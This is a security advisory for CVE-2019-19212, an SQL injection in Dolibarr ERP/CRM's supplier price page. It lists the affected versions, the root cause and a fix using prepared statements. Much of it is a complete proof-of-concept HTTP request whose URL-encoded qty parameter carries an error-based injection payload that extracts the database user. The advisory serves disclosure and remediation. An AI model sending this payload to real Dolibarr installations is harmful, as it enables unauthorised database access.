```text
ID: CVE-2019-19212
Description: It is possible to execute arbitrary SQL commands by manipulating the qty parameter while editing the price of an product, used by /dolibarr/htdocs/product/fournisseurs.php
Product: Dolibarr ERP/CRM
Affected Version: 3.0 â€“ 10.0.3
Vulnerability Type: SQL injection
Security Risk: Critical
Attack vector: By manipulating the qty parameter while editing the price of a product.
Location: /dolibarr/htdocs/product/fournisseurs.php
Proof of Concept:
POST /dolibarr/htdocs/product/fournisseurs.php?id=1 HTTP/1.1

Host: localhost

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:60.0) Gecko/20100101 Firefox/60.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: de-DE

Accept-Encoding: gzip, deflate

Referer: http://localhost/dolibarr/htdocs/product/fournisseurs.php?id=1&amp;action=add\_price

Content-Type: application/x-www-form-urlencoded

Content-Length: 494

Cookie: DOLSESSID\_d62fd6e735d72194222ef3c6d1021d7a=hltic273b6m378p7a1qrqf1b2d

Connection: close

Upgrade-Insecure-Requests: 1

token=%242y%2410%24TZJzw%2F3dPdYxPhcc.H1gF.JSduPMJyndwzgx1Bc7Wsd7XSGmOvgMe&amp;action=updateprice&amp;id\_fourn=1&amp;ref\_fourn=1234&amp;qty=%28SELECT%209354%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71767a7a71%2C%28MID%28%28IFNULL%28CAST%28CURRENT\_USER%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C54%29%29%2C0x7170767a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION\_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29&amp;tva\_tx=0&amp;price=123&amp;price\_base\_type=HT&amp;remise\_percent=&amp;delivery\_time\_days=&amp;supplier\_reputation=-1
Root cause: Building the SQL query by hand is always more prone to errors which lead to vulnerabilities.
Fix: It is recommended to use prepared statements.
Discovered by: Daniel Hoffmann of usd AG.
```